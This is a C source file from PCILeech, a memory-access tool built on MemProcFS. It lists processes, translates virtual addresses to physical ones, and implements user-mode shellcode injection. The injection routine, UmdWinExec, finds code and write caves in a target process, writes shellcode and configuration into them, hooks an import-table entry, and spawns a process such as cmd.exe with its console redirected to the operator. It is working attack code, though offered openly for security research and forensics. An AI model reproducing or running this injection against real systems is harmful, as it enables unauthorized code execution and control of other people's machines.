// umd.c : implementation related to various user-mode functionality supported
//         by the Memory Process File System / MemProcFS / vmm.dll integration.
//
// (c) Ulf Frisk, 2019
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "umd.h"
#ifdef WIN32
#include "executor.h"
#include "util.h"
#include "vmmprx.h"

int UmdCompare32(const void* a, const void* b)
{
    return *(int*)a - *(int*)b;
}

/*
* List all processes in the target system memory by using the MemProcFS integration.
*/
VOID Action_UmdPsList()
{
    QWORD i, cbProcInfo, cPIDs = 0x1000;
    DWORD dwPIDs[0x1000] = { 0 };
    VMMDLL_PROCESS_INFORMATION oProcInfo;
    // 1: Initialize vmm.dll / memory process file system
    if(!VmmPrx_Initialize(FALSE)) {
        printf("UMD: Failed initializing required MemProcFS/vmm.dll\n");
        return;
    }
    // 2: List processes and iterate over result
    if(!VmmPrx_PidList(dwPIDs, &cPIDs)) {
        printf("UMD: Failed list PIDs.\n");
    } else {
        qsort(dwPIDs, cPIDs, sizeof(DWORD), UmdCompare32);
        for(i = 0; i < cPIDs; i++) {
            ZeroMemory(&oProcInfo, sizeof(VMMDLL_PROCESS_INFORMATION));
            oProcInfo.magic = VMMDLL_PROCESS_INFORMATION_MAGIC;
            oProcInfo.wVersion = VMMDLL_PROCESS_INFORMATION_VERSION;
            cbProcInfo = sizeof(VMMDLL_PROCESS_INFORMATION);
            if(VmmPrx_ProcessGetInformation(dwPIDs[i], &oProcInfo, &cbProcInfo)) {
                printf("  %6i %s %s\n", oProcInfo.dwPID, oProcInfo.os.win.fWow64 ? "32" : "  ", oProcInfo.szName);
            }
        }
    }
    VmmPrx_Close();
}

/*
* Translate a virtual address into a physical address for a given process id (pid).
*/
VOID Action_UmdPsVirt2Phys()
{
    QWORD pa, cbProcInfo;
    VMMDLL_PROCESS_INFORMATION oProcInfo;
    // 1: Initialize vmm.dll / memory process file system
    if(!VmmPrx_Initialize(FALSE)) {
        printf("UMD: Failed initializing required MemProcFS/vmm.dll\n");
        return;
    }
    // 2: Retrieve process name and translate virtual to physical address
    ZeroMemory(&oProcInfo, sizeof(VMMDLL_PROCESS_INFORMATION));
    oProcInfo.magic = VMMDLL_PROCESS_INFORMATION_MAGIC;
    oProcInfo.wVersion = VMMDLL_PROCESS_INFORMATION_VERSION;
    cbProcInfo = sizeof(VMMDLL_PROCESS_INFORMATION);
    if(!VmmPrx_ProcessGetInformation((DWORD)ctxMain->cfg.qwDataIn[0], &oProcInfo, &cbProcInfo)) {
        printf("UMD: Failed retrieving information for PID: %i\n", ctxMain->cfg.qwDataIn[0]);
        printf("     SYNTAX: pcileech psvirt2phys -0 <pid> -1 <virtual_address>\n");
        goto fail;
    }
    if(!VmmPrx_MemVirt2Phys((DWORD)ctxMain->cfg.qwDataIn[0], ctxMain->cfg.qwDataIn[1], &pa)) {
        printf("UMD: Failed translating address 0x%016llx for process %s (%i)\n", ctxMain->cfg.qwDataIn[1], oProcInfo.szName, ctxMain->cfg.qwDataIn[0]);
        printf("     SYNTAX: pcileech psvirt2phys -0 <pid> -1 <virtual_address>\n");
        goto fail;
    }
    printf("%s (%i) 0x%016llX (virtual) -> 0x%016llX (physical)\n", oProcInfo.szName, ctxMain->cfg.qwDataIn[0], ctxMain->cfg.qwDataIn[1], pa);
fail:
    VmmPrx_Close();
}

// struct shared with wx64_umd_exec_c.c
typedef struct tdUMD_EXEC_CONTEXT_LIMITED {
    CHAR fCMPXCHG;
    CHAR fEnableConsoleRedirect;            // config value set by pcileech
    CHAR fThreadIsActive;
    CHAR fStatus;
    DWORD dwFlagsCreateProcessA;            // config value set by pcileech
    QWORD qwDEBUG;
    QWORD pInfoIn;
    QWORD pInfoOut;
    HANDLE hInWrite;
    HANDLE hOutRead;
    HANDLE hOutWriteCP;
    HANDLE hInReadCP;
    HANDLE hProcessHandle;
    struct {                                // config value set by pcileech
        QWORD CloseHandle;
        QWORD CreatePipe;
        QWORD CreateProcessA;
        QWORD CreateThread;
        QWORD GetExitCodeProcess;
        QWORD ReadFile;
        QWORD Sleep;
        QWORD WriteFile;
        QWORD LocalAlloc;
    } fn;
    CHAR szProcToStart[MAX_PATH];           // config value set by pcileech
} UMD_EXEC_CONTEXT_LIMITED, *PUMD_EXEC_CONTEXT_LIMITED;

/*
* A Basic Usermode shellcode injection technique leveraging read-only analysis
* functionality using the MemProcFS API to identify injection points and also
* functions that the injected shellcode uses.
* If all prerequisites are met then the MemProcFS API is used to write the
* shellcode into the virtual memory of a specific process (technically into
* the backing physical page if it's shared - so be careful!).
* Future plan is to expand in this injection functionality to make it easier
* to use and more like the more versatile KMD functionality...
*/
VOID UmdWinExec()
{
    BOOL result;
    LPSTR szModuleName;
    DWORD cbExec = 0;
    BYTE pbExec[0x500], pbPage[0x1000];
    DWORD i, dwPID, cSections;
    QWORD vaCodeCave = 0, vaWriteCave = 0;
    PIMAGE_SECTION_HEADER pSections;
    SIZE_T cbProcessInformation;
    VMMDLL_PROCESS_INFORMATION oProcessInformation = { 0 };
    VMMDLL_WIN_THUNKINFO_IAT oThunkInfoIAT = { 0 };
    UMD_EXEC_CONTEXT_LIMITED ctx = { 0 };
    QWORD qwTickCountLimit;
    CHAR szHookBuffer[MAX_PATH] = { 0 };
    LPSTR szHookModule = NULL, szHookFunction = NULL;
    //--------------------------------------------------------------------------
    // 1: Retrieve process PID and module/function to hook in the main executable IAT.
    //--------------------------------------------------------------------------
    dwPID = (DWORD)ctxMain->cfg.qwDataIn[0];
    Util_SplitString2(ctxMain->cfg.szHook, '!', szHookBuffer, &szHookModule, &szHookFunction);
    if(!dwPID || !szHookModule[0] || !szHookFunction[0]) {
        printf(
            "UMD: Required aguments are missing - Syntax is:                                \n" \
            "  -0 <pid> -1 <CreateFlags> -2 <ConRedir> -s <ProcessToSpawn> -hook <Module!Fn>\n" \
            "  Example:                                                                     \n" \
            "    pcileech UMD_WINX64_IAT_PSCREATE -0 654 -hook ADVAPI32.dll!RegCloseKey     \n" \
            "    -1 0x08000000 -2 1 -s c : \\windows\\system32\\cmd.exe                     \n");
        return;
    }
    //--------------------------------------------------------------------------
    // 2: Verify process and locate 'IAT inject', r-x 'code cave' and rw- 'config cave'.
    //--------------------------------------------------------------------------
    oProcessInformation.magic = VMMDLL_PROCESS_INFORMATION_MAGIC;
    oProcessInformation.wVersion = VMMDLL_PROCESS_INFORMATION_VERSION;
    cbProcessInformation = sizeof(VMMDLL_PROCESS_INFORMATION);
    if(!VmmPrx_ProcessGetInformation(dwPID, &oProcessInformation, &cbProcessInformation)) {
        printf("UMD: EXEC: Could not retrieve process for PID: %i\n", dwPID);
        return;
    }
    szModuleName = oProcessInformation.szName;
    result = VmmPrx_WinGetThunkInfoIAT(dwPID, oProcessInformation.szName, szHookModule, szHookFunction, &oThunkInfoIAT);
    if(!result) {
        printf("UMD: EXEC: Could not retrieve hook for %s!%s in '%s'\n", szHookModule, szHookFunction, oProcessInformation.szName);
        return;
    }
    if(!oThunkInfoIAT.fValid || oThunkInfoIAT.f32) {
        printf("UMD: EXEC: Could not retrieve valid hook in 64-bit process.\n");
        return;
    }
    if(!VmmPrx_ProcessGetSections(dwPID, szModuleName, NULL, 0, &cSections) || !cSections) {
        printf("UMD: EXEC: Could not retrieve sections #1 for '%s'\n", szModuleName);
        return;
    }
    pSections = (PIMAGE_SECTION_HEADER)LocalAlloc(LMEM_ZEROINIT, cSections * sizeof(IMAGE_SECTION_HEADER));
    if(!pSections || !VmmPrx_ProcessGetSections(dwPID, szModuleName, pSections, cSections, &cSections) || !cSections) {
        printf("UMD: EXEC: Could not retrieve sections #2 for '%s'\n", szModuleName);
        return;
    }
    for(i = 0; i < cSections; i++) {
        if(!vaCodeCave && (pSections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && ((pSections[i].Misc.VirtualSize & 0xfff) < (0x1000 - sizeof(pbExec)))) {
            vaCodeCave = VmmPrx_ProcessGetModuleBase(dwPID, szModuleName) + ((pSections[i].VirtualAddress + pSections[i].Misc.VirtualSize + 0xfff) & ~0xfff) - sizeof(pbExec);
            if(!VmmPrx_MemReadPage(dwPID, vaCodeCave & ~0xfff, pbPage)) {
                vaCodeCave = 0;     // read test failed!
            }
        }
        if(!vaWriteCave && (pSections[i].Characteristics & IMAGE_SCN_MEM_WRITE) && ((pSections[i].Misc.VirtualSize & 0xfff) < (0x1000 - sizeof(ctx)))) {
            vaWriteCave += VmmPrx_ProcessGetModuleBase(dwPID, szModuleName) + ((pSections[i].VirtualAddress + pSections[i].Misc.VirtualSize + 0xfff) & ~0xfff) - sizeof(ctx);
            if(!VmmPrx_MemReadPage(dwPID, vaWriteCave & ~0xfff, pbPage)) {
                vaWriteCave = 0;     // read test failed!
            }
        }
    }
    if(!vaCodeCave || !vaWriteCave) {
        if(!vaCodeCave) {
            printf("UMD: EXEC: Could not locate suitable code cave in '%s'\n", szModuleName);
        }
        if(!vaWriteCave) {
            printf("UMD: EXEC: Could not locate suitable write cave in '%s'\n", szModuleName);
        }
        return;
    }
    //------------------------------------------------
    // 3: Prepare Inject
    //------------------------------------------------
    // prepare shellcode (goes into r-x section)
    Util_ParseHexFileBuiltin("DEFAULT_WINX64_UMD_EXEC", pbExec, sizeof(pbExec), &cbExec);
    *(PQWORD)(pbExec + 0x08) = vaWriteCave;
    *(PQWORD)(pbExec + 0x10) = oThunkInfoIAT.vaFunction;
    // prepare configuration data (goes into rw- section)
    ctx.qwDEBUG = 0;
    ctx.fn.CloseHandle = VmmPrx_ProcessGetProcAddress(dwPID, "kernel32.dll", "CloseHandle");
    ctx.fn.CreatePipe = VmmPrx_ProcessGetProcAddress(dwPID, "kernel32.dll", "CreatePipe");
    ctx.fn.CreateProcessA = VmmPrx_ProcessGetProcAddress(dwPID, "kernel32.dll", "CreateProcessA");
    ctx.fn.CreateThread = VmmPrx_ProcessGetProcAddress(dwPID, "kernel32.dll", "CreateThread");
    ctx.fn.GetExitCodeProcess = VmmPrx_ProcessGetProcAddress(dwPID, "kernel32.dll", "GetExitCodeProcess");
    ctx.fn.LocalAlloc = VmmPrx_ProcessGetProcAddress(dwPID, "kernel32.dll", "LocalAlloc");
    ctx.fn.ReadFile = VmmPrx_ProcessGetProcAddress(dwPID, "kernel32.dll", "ReadFile");
    ctx.fn.Sleep = VmmPrx_ProcessGetProcAddress(dwPID, "kernel32.dll", "Sleep");
    ctx.fn.WriteFile = VmmPrx_ProcessGetProcAddress(dwPID, "kernel32.dll", "WriteFile");
    strcpy_s(ctx.szProcToStart, MAX_PATH - 1, ctxMain->cfg.szInS);
    ctx.dwFlagsCreateProcessA = (DWORD)ctxMain->cfg.qwDataIn[1];
    ctx.fEnableConsoleRedirect = ctxMain->cfg.qwDataIn[2] ? 1 : 0;
    //------------------------------------------------
    // 4: Inject & Hook
    //------------------------------------------------
    printf("UMD: EXEC: Injecting code and configuration data into process %s\n", szModuleName);
    printf("           IAT Hook : %s!%s at 0x%llx [0x%llx]\n", szHookModule, szHookFunction, oThunkInfoIAT.vaThunk, oThunkInfoIAT.vaFunction);
    VmmPrx_MemWrite(dwPID, vaWriteCave, (PBYTE)&ctx, sizeof(UMD_EXEC_CONTEXT_LIMITED));
    VmmPrx_MemWrite(dwPID, vaCodeCave, pbExec, sizeof(pbExec));
    VmmPrx_MemWrite(dwPID, oThunkInfoIAT.vaThunk, (PBYTE)&vaCodeCave, 8);
    //------------------------------------------------
    // 5: Wait for execution
    //------------------------------------------------
    printf("           Waiting for execution ...\n");
    qwTickCountLimit = GetTickCount64() + 15 * 1000;    // wait for 15s max
    while(TRUE) {
        if(qwTickCountLimit < GetTickCount64()) { break; }
        if(!VmmPrx_MemReadEx(dwPID, vaWriteCave, (PBYTE)&ctx, sizeof(UMD_EXEC_CONTEXT_LIMITED), NULL, VMMDLL_FLAG_NOCACHE)) { break; }
        if(ctx.fStatus) { break; }
        Sleep(10);
    }
    if(!ctx.fStatus) {
        printf("           FAILED! Error or Timeout after 15s.\n");
    } else {
        Sleep(10);
        if(ctx.pInfoIn && ctx.pInfoOut) {
            VmmPrx_Refresh(0);  // force refresh - shellcode allocations may have updated virtual memory map (page tables).
            printf("           Succeeded - Connecting to console ...\n");
            Exec_ConsoleRedirect(ctx.pInfoIn, ctx.pInfoOut, dwPID);
        } else {
            printf("           Succeeded.\n");
        }
    }
    //------------------------------------------------
    // 6: Restore
    //------------------------------------------------
    printf("           Restoring...\n");
    ZeroMemory(pbExec, sizeof(pbExec));
    ZeroMemory(&ctx, sizeof(UMD_EXEC_CONTEXT_LIMITED));
    VmmPrx_MemWrite(dwPID, oThunkInfoIAT.vaThunk, (PBYTE)&oThunkInfoIAT.vaFunction, 8);
    Sleep(10);
    VmmPrx_MemWrite(dwPID, vaCodeCave, pbExec, sizeof(pbExec));
    VmmPrx_MemWrite(dwPID, vaWriteCave, (PBYTE)&ctx, sizeof(UMD_EXEC_CONTEXT_LIMITED));
}

VOID ActionExecUserMode()
{
    if(!VmmPrx_Initialize(FALSE)) {
        printf("UMD: Failed initializing required MemProcFS/vmm.dll\n");
        return;
    }
    if(0 == _stricmp(ctxMain->cfg.szShellcodeName, "UMD_WINX64_IAT_PSEXEC")) {
        UmdWinExec();
    } else {
        printf("UMD: Not found.\n");
    }
    VmmPrx_Close();
}

#endif /* WIN32 */
#ifdef LINUX

VOID Action_UmdPsList()
{
    printf("UMD: Not supported on Linux - require: Windows-only MemProcFS/vmm.dll\n");
}

VOID Action_UmdPsVirt2Phys()
{
    printf("UMD: Not supported on Linux - require: Windows-only MemProcFS/vmm.dll\n");
}

VOID ActionExecUserMode()
{
    printf("UMD: Not supported on Linux - require: Windows-only MemProcFS/vmm.dll\n");
}

#endif /* LINUX */
